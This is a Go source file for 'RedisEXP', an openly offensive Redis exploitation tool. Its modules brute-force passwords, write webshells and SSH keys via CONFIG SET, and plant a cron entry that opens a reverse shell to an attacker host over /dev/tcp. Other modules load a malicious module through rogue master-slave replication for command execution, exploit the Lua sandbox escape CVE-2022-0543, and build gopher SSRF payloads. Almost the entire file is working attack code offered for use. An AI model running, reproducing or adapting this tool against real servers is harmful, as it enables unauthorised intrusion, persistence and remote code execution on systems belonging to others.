package main

import (
	"RedisEXP/exp"
	"bufio"
	"context"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"github.com/redis/go-redis/v9"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io"
	"io/ioutil"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var ctx = context.Background()
var rdb *redis.Client

var (
	modules, rhost, rport, lhost, lport, pwd, fileName string
	redisDir, redisDBFilename                          string
	command, rpath, rfile, lfile, webshell, user       string
	b64                                                bool
)

func init() {
	flag.StringVar(&modules, "m", "", "利用模式(rce,upload,shell,ssh,cron,cve,gopher,brute,close,bgsave)")
	flag.StringVar(&rhost, "r", "", "目标IP")
	flag.StringVar(&rport, "p", "6379", "目标端口")
	flag.StringVar(&lhost, "L", "", "本地IP | VPS IP")
	flag.StringVar(&lport, "P", "6379", "本地端口 | VPS Port")
	flag.StringVar(&pwd, "w", "", "Redis密码")
	flag.StringVar(&fileName, "f", "", "Redis密码文件 | gopher 模板文件")
	flag.StringVar(&command, "c", "", "单次执行命令")

	flag.StringVar(&rpath, "rp", ".", "目标路径")
	flag.StringVar(&rfile, "rf", "", "目标文件名")
	flag.StringVar(&lfile, "lf", "", "本地文件名")
	flag.StringVar(&webshell, "s", "", "webshell 内容 | ssh 公钥[id_rsa.pub]")

	flag.StringVar(&user, "u", "root", "设置 ssh 用户名")

	flag.BoolVar(&b64, "b", false, "对 webshell, ssh公钥等内容进行Base64解码")

}

func main() {
	logo := `
██████╗ ███████╗██████╗ ██╗███████╗    ███████╗██╗  ██╗██████╗ 
██╔══██╗██╔════╝██╔══██╗██║██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗
██████╔╝█████╗  ██║  ██║██║███████╗    █████╗   ╚███╔╝ ██████╔╝
██╔══██╗██╔══╝  ██║  ██║██║╚════██║    ██╔══╝   ██╔██╗ ██╔═══╝ 
██║  ██║███████╗██████╔╝██║███████║    ███████╗██╔╝ ██╗██║
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝ @yuyan-sec
`
	fmt.Println(logo)
	flag.Parse()

	if rhost == "" {
		flag.Usage()
		return
	}

	// 处理不同的模块选项
	switch strings.ToLower(modules) {
	case "brute":
		if err := connection(rhost, rport, pwd); err == nil {
			fmt.Println("存在未授权 Redis，不需要输入密码")
			return
		}

		if fileName == "" {
			fmt.Println("参数错误: RedisExp.exe -m brute -r 目标IP -p 目标端口 -f 密码字典")
			return
		}

		brutePWD(rhost, rport, fileName)

	case "gopher":
		if rhost == "" {
			rhost = "127.0.0.1"
		}
		gopher(fmt.Sprintf("%s:%s", rhost, rport), fileName)

	default:
		// 默认连接和配置获取
		if err := connection(rhost, rport, pwd); err != nil {
			fmt.Println(err)
			return
		}

		redisDir = configGet("dir")
		redisDBFilename = configGet("dbfilename")

		switch strings.ToLower(modules) {
		case "cve":
			if command != "" {
				redisLua(command)
			} else {
				loopCmd("cve")
			}

		case "shell":
			if rpath == "" || rfile == "" || webshell == "" {
				fmt.Println("参数错误: RedisExp.exe -m shell -r 目标IP -p 目标端口 -w 密码 -rp 目标路径 -rf 目标文件名 -s Webshell内容")
				return
			}

			echoShell(rpath, rfile, webshell)

		case "ssh":
			if user == "" || webshell == "" {
				fmt.Println("参数错误: RedisExp.exe -m ssh -r 目标IP -p 目标端口 -w 密码 -u 用户名 -s 公钥")
				return
			}

			if user == "root" {
				user = "/root/.ssh/"
			} else if !strings.Contains(user, "/") {
				user = fmt.Sprintf("/home/%s/.ssh/", user)
			}

			echoShell(user, "authorized_keys", webshell)

		case "cron":
			if lhost == "" || lport == "" {
				fmt.Println("参数错误: RedisExp.exe -m cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort")
				return
			}

			webshell = fmt.Sprintf("*/1 * * * * root /bin/bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
			echoShell("/etc/cron.d/", "getshell", webshell)

		case "rce":
			if lhost == "" {
				fmt.Println("参数错误: RedisExp.exe -m rce -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行] -rf 目标文件名(exp.dll | exp.so) -rp 目标路径")
				return
			}

			if strings.EqualFold(rfile, "") {
				rfile = "exp.dll"
			}

			redisSlave(lhost, lport, rpath, rfile)

			if command != "" {
				runCmd(command)
				closeSlave(rfile)
				return
			} else {
				loopCmd("rce")
			}

		case "upload":
			if strings.EqualFold(lhost, "") || strings.EqualFold(rfile, "") || strings.EqualFold(lfile, "") {
				fmt.Println("参数错误: RedisExp.exe -m upload -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -rp 目标路径 -rf 目标文件名 -lf 本地文件")
				return
			}

			redisUpload(lhost, lport, rpath, rfile, lfile)

		case "close":
			closeSlave(rfile)

		case "bgsave":
			bg := rdb.BgSave(ctx).Val()
			if strings.EqualFold(bg, "Background saving started") {
				fmt.Println("[OK]\tbgsave")
			} else {
				fmt.Println("[==]\tbg")
			}

		default:
			redisVersion()
		}
	}
}

// 连接redis
func connection(rhost, rport, password string) error {
	rdb = redis.NewClient(&redis.Options{
		Addr:     fmt.Sprintf("%s:%s", rhost, rport),
		Password: password, // 密码
		DB:       0,        // 数据库
		PoolSize: 3,        // 连接池大小
	})

	_, err := rdb.Ping(ctx).Result()

	if err != nil {
		return err
	}

	return nil
}

// redisVersion 查看redis版本
func redisVersion() {
	info := rdb.Info(ctx, "server")

	for _, s := range strings.Split(info.Val(), "\r\n") {
		switch {
		case strings.Contains(s, "redis_version"), strings.Contains(s, "os"), strings.Contains(s, "arch_bits"):
			fmt.Printf("%v\n", s)
		}
	}

	fmt.Println("dir: ", redisDir)
	fmt.Println("dbfilename: ", redisDBFilename)
}

// config get xxx
func configGet(str string) string {
	var res string
	result, err := rdb.ConfigGet(ctx, str).Result()
	if err != nil {
		return err.Error()
	}

	for _, v := range result {
		res = v
	}
	return res
}

// config set xxx
func configSet(str, data string) string {
	result, err := rdb.ConfigSet(ctx, str, data).Result()
	if err != nil {
		return err.Error()
	}

	return result
}

func echoShell(dir, dbfilename, webshell string) {

	defer func() {
		// 恢复原始配置
		fmt.Printf("[%s]\tconfig set dir %s\n", configSet("dir", redisDir), redisDir)
		fmt.Printf("[%s]\tconfig set dbfilename %s\n", configSet("dbfilename", redisDBFilename), redisDBFilename)
		fmt.Printf("[%s]\tconfig set rdbcompression %s\n", configSet("rdbcompression", configGet("rdbcompression")), configGet("rdbcompression"))
		fmt.Printf("[%s]\tconfig set slave-read-only %s\n", configSet("slave-read-only", configGet("slave-read-only")), configGet("slave-read-only"))
	}()

	if dirOK := configSet("dir", dir); dirOK != "OK" {
		fmt.Printf("[ERROR]\tFailed to set dir to %s\n", dir)
		return
	}
	fmt.Printf("[OK]\tconfig set dir %s\n", dir)

	if dbfilenameOK := configSet("dbfilename", dbfilename); dbfilenameOK != "OK" {
		fmt.Printf("[ERROR]\tFailed to set dbfilename to %s\n", dbfilename)
		return
	}
	fmt.Printf("[OK]\tconfig set dbfilename %s\n", dbfilename)

	if b64 {
		decodeBytes, err := base64.StdEncoding.DecodeString(webshell)
		if err != nil {
			fmt.Println(err)
			return
		}
		webshell = string(decodeBytes)
	}

	webshell = fmt.Sprintf("\n\n\n\n\n%v\n\n\n\n", webshell)
	ok, err := rdb.Set(ctx, "webshell", webshell, time.Minute*2).Result()

	readOnly := configGet("slave-read-only")

	if err != nil {
		if strings.Contains(err.Error(), "READONLY You can't write against a read only replica.") {
			fmt.Println("[GG]\t目标开启了主从, 尝试关闭 slave-read-only 来写入文件")

			if strings.EqualFold(readOnly, "yes") {
				fmt.Printf("[%s]\tconfig set slave-read-only no\n", configSet("slave-read-only", "no"))
				ok, _ = rdb.Set(ctx, "webshell", webshell, time.Minute*2).Result()
			}

		} else {
			fmt.Printf("[xx]\t%v\n", err)
			return
		}
	}

	fmt.Printf("[%v]\t%v\n", ok, "set webshell "+strings.ReplaceAll(webshell, "\n", ""))

	// 关闭redis压缩来写入文件
	compression := configGet("rdbcompression")

	if strings.EqualFold(compression, "yes") {
		fmt.Printf("[%s]\tconfig set rdbcompression no\n", configSet("rdbcompression", "no"))
	}

	bg := rdb.BgSave(ctx).Val()
	if strings.EqualFold(bg, "Background saving started") {
		fmt.Println("[OK]\tbgsave")
	} else {
		fmt.Println("[==]\tbg")
	}

	fmt.Printf("[%v ]\tdel webshell\n", rdb.Del(ctx, "webshell").Val())

}

// RedisSlave 开启主从复制
func redisSlave(lhost, lport, dir, dbfilename string) {
	var payload []byte
	if strings.Contains(dbfilename, ".so") {
		payload = exp.SoPayload
	} else {
		payload = exp.DllPayload
	}

	bg := rdb.BgSave(ctx).Val()
	if strings.EqualFold(bg, "Background saving started") {
		fmt.Println("[OK]\tbgsave")
	} else {
		fmt.Println("[==]\tbg")
	}

	//slave := fmt.Sprintf("slaveof %v %v", lhost, lport)

	fmt.Printf("[%v]\tslaveof %v %v\n", rdb.SlaveOf(ctx, lhost, lport).Val(), lhost, lport)

	if dirOK := configSet("dir", dir); dirOK != "OK" {
		fmt.Printf("[ERROR]\tFailed to set dir to %s\n", dir)
		return
	}
	fmt.Printf("[OK]\tconfig set dir %s\n", dir)

	if dbfilenameOK := configSet("dbfilename", dbfilename); dbfilenameOK != "OK" {
		fmt.Printf("[ERROR]\tFailed to set dbfilename to %s\n", dbfilename)
		return
	}
	fmt.Printf("[OK]\tconfig set dbfilename %s\n", dbfilename)

	err := listen(lport, payload)
	if err != nil {
		fmt.Printf("[xx]\t%v\n", err)
		return
	}

	load := fmt.Sprintf("%v/%v", dir, dbfilename)

	val, err := rdb.Do(ctx, "module", "load", load).Result()
	if err != nil {
		fmt.Printf("[xx]\t%v\n", err)
		return
	}

	fmt.Printf("[%s]\tmodule load %s\n", val, load)

	defer func() {
		// 恢复原始配置
		fmt.Printf("[%s]\tconfig set dir %s\n", configSet("dir", redisDir), redisDir)
		fmt.Printf("[%s]\tconfig set dbfilename %s\n", configSet("dbfilename", redisDBFilename), redisDBFilename)
	}()
}

// Listen 开启TCP端口
func listen(lport string, payload []byte) error {

	addr := fmt.Sprintf("0.0.0.0:%v", lport)
	//fmt.Println(addr)

	var wg sync.WaitGroup
	wg.Add(1)

	tcpAddr, err := net.ResolveTCPAddr("tcp", addr)
	if err != nil {
		return err
	}

	tcpListen, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		return err
	}

	defer tcpListen.Close()

	c, err := tcpListen.AcceptTCP()
	if err != nil {
		return err
	}

	go sendCmd(payload, &wg, c)
	wg.Wait()

	c.Close()

	return nil
}

// 读取dll进行主从
func sendCmd(payload []byte, wg *sync.WaitGroup, c *net.TCPConn) {

	defer wg.Done()

	buf := make([]byte, 1024)
	for {
		n, err := c.Read(buf)
		if err == io.EOF {
			return
		}

		if err != nil {
			return
		}

		switch {
		case strings.Contains(string(buf[:n]), "PING"):
			c.Write([]byte("+PONG\r\n"))

		case strings.Contains(string(buf[:n]), "REPLCONF"):
			c.Write([]byte("+OK\r\n"))

		case strings.Contains(string(buf[:n]), "SYNC"):
			resp := "+FULLRESYNC " + "0000000000000000000000000000000000000000" + " 1" + "\r\n"
			resp += "$" + fmt.Sprintf("%v", len(payload)) + "\r\n"
			respb := []byte(resp)
			respb = append(respb, payload...)
			respb = append(respb, []byte("\r\n")...)
			c.Write(respb)
		}
	}
}

// RunCmd system.exec 执行命令
func runCmd(cmd string) {

	val, err := rdb.Do(ctx, "system.exec", cmd).Result()
	if err != nil {
		fmt.Printf("[xx]\t%v\n", err)
		return
	}

	if len(val.(string)) > 0 {
		fmt.Println("\n" + GbkToUtf8(val.(string)))
	}

}

// CloseSlave 关闭主从复制
func closeSlave(dll string) {

	// 执行 SLAVEOF NO ONE 命令
	result, err := rdb.Do(ctx, "SLAVEOF", "NO", "ONE").Result()
	if err != nil {
		fmt.Printf("[xx]\t%v\n", err)
		return
	}

	fmt.Printf("[%v]\tslaveof no one\n", result)

	if strings.EqualFold(dll, "upload") {
		return
	}

	// 执行命令才卸载 module
	if strings.Contains(dll, ".so") {
		runCmd("rm " + dll)
		fmt.Printf("[==]\trm %s\n", dll)
	}

	// 执行 MODULE UNLOAD <module_name> 命令
	result, err = rdb.Do(ctx, "MODULE", "UNLOAD", "system").Result()
	if err != nil {
		fmt.Printf("[xx]\t%v\n", err)
		return
	}

	fmt.Printf("[%v]\tmodule unload system\n", result)
}

// RedisUpload 主从复制上传文件
func redisUpload(lhost, lport, rpath, rfile, lfile string) {

	// 判断文件大小，发现个Redis  Bug 小于9个字节可能会把 Redis 给打崩
	fi, err := os.Stat(lfile)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}

	if fi.Size() < 9 {
		fmt.Println(fmt.Sprintf("当前文件大小：%d 个字节，不能上传小于 9 个字节, 因为可能会把Redis打崩哦", fi.Size()))
		os.Exit(0)
	}

	// 上传文件
	f, err := os.Open(lfile)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}

	payload, err := ioutil.ReadAll(f)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}

	fmt.Printf("[%v]\tslaveof %v %v\n", rdb.SlaveOf(ctx, lhost, lport).Val(), lhost, lport)

	if dirOK := configSet("dir", rpath); dirOK != "OK" {
		fmt.Printf("[ERROR]\tFailed to set dir to %s\n", rpath)
		return
	}
	fmt.Printf("[OK]\tconfig set dir %s\n", rpath)

	if dbfilenameOK := configSet("dbfilename", rfile); dbfilenameOK != "OK" {
		fmt.Printf("[ERROR]\tFailed to set dbfilename to %s\n", rfile)
		return
	}
	fmt.Printf("[OK]\tconfig set dbfilename %s\n", rfile)

	listen(lport, payload)

	fmt.Printf("[OK]\t%v\\%v uploaded successfully\n", rpath, rfile)

	defer func() {
		// 恢复原始配置
		closeSlave("upload")
		fmt.Printf("[%s]\tconfig set dir %s\n", configSet("dir", redisDir), redisDir)
		fmt.Printf("[%s]\tconfig set dbfilename %s\n", configSet("dbfilename", redisDBFilename), redisDBFilename)
	}()
}

// 爆破密码
func brutePWD(rhost, rport, filename string) {
	pwds, err := readFile(filename)
	if err != nil {
		fmt.Println(err)
		return
	}

	ch := make(chan struct{}, 1)
	var wg sync.WaitGroup

	for _, pass := range pwds {
		wg.Add(1)
		ch <- struct{}{}
		go func(pass string) {
			defer wg.Done()

			err := connection(rhost, rport, pass)

			if err == nil {
				fmt.Println("成功爆破到 Redis 密码：" + pass)
				os.Exit(0)
			} else if strings.Contains(err.Error(), "ERR Client sent AUTH, but no password is set") {
				fmt.Println("存在未授权 Redis , 不需要输入密码")
				os.Exit(0)
			} else if strings.Contains(err.Error(), "No connection could be made because the target machine actively refused it.") || strings.Contains(err.Error(), "context deadline exceeded") || strings.Contains(err.Error(), "i/o timeout") {
				fmt.Println("Redis 连接超时")
				os.Exit(0)
			}

			<-ch
		}(pass)
	}

	wg.Wait()
	fmt.Println("未发现 Redis 密码")
}

// ReadFile 读取密码字典
func readFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var result []string
	for scanner.Scan() {
		str := strings.TrimSpace(scanner.Text())
		if str != "" {
			result = append(result, str)
		}
	}
	return result, err
}

// RedisLua Lua沙盒绕过命令执行 CVE-2022-0543
func redisLua(cmd string) {

	val, err := rdb.Do(ctx, "eval", fmt.Sprintf(`local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("%v", "r"); local res = f:read("*a"); f:close(); return res`, cmd), "0").Result()
	if err != nil {
		fmt.Println("不存在漏洞:", err)
		os.Exit(0)
	}
	fmt.Println(Utf8ToGbk(val.(string)))
}

func Utf8ToGbk(str string) string {
	enc := simplifiedchinese.GBK.NewEncoder()
	gbkBytes, err := enc.String(str)
	if err != nil {
		return err.Error()
	}
	return gbkBytes
}

func GbkToUtf8(str string) string {
	decoder := simplifiedchinese.GB18030.NewDecoder()
	utf8Bytes, _, err := transform.Bytes(decoder, []byte(str))
	if err != nil {
		return err.Error()
	}
	return string(utf8Bytes)
}

// 循环执行命令和CVE
func loopCmd(m string) {

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(">>> ")
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")

		if strings.EqualFold(cmd, "exit") || strings.EqualFold(cmd, "q") {

			if strings.EqualFold(m, "rce") {
				closeSlave(rfile)
			}

			break
		}
		if strings.EqualFold(m, "cve") {
			redisLua(cmd)
		}

		if strings.EqualFold(m, "rce") {
			runCmd(cmd)
		}

	}
}

// 生成 gopher
func gopher(ip string, gopherFile string) {

	strs, err := readFile(gopherFile)
	if err != nil {
		fmt.Println(err)
		return
	}

	exp := ""

	for _, str := range strs {

		word := ""
		str_flag := false
		var redis_resps []string

		for _, char := range str {

			if str_flag {
				if char == '"' || char == '\'' {
					str_flag = false
					if word != "" {
						redis_resps = append(redis_resps, word)
					}

					word = ""
				} else {
					word += string(char)
				}
			} else if word == "" && (char == '"' || char == '\'') {
				str_flag = true
			} else {
				if char == ' ' {
					if word != "" {
						redis_resps = append(redis_resps, word)
					}

					word = ""
				} else if char == '\n' {
					if word != "" {
						redis_resps = append(redis_resps, word)
					}

					word = ""
				} else {
					word += string(char)
				}

			}

		}

		if word != "" {
			redis_resps = append(redis_resps, word)
		}

		tmp_line := "*" + strconv.Itoa(len(redis_resps)) + "\r\n"

		for _, word := range redis_resps {
			tmp_line += "$" + strconv.Itoa(len(word)) + "\r\n" + word + "\r\n"
		}

		for _, v := range tmp_line {

			exp += hex.EncodeToString([]byte(string(v)))
		}

	}

	fmt.Printf("gopher://%s/_%%%s\n\n", ip, split(exp))
}

func split(s string) string {
	n := len(s)
	if n <= 2 {
		return s
	}
	return split(s[:n-2]) + "%" + s[n-2:]
}
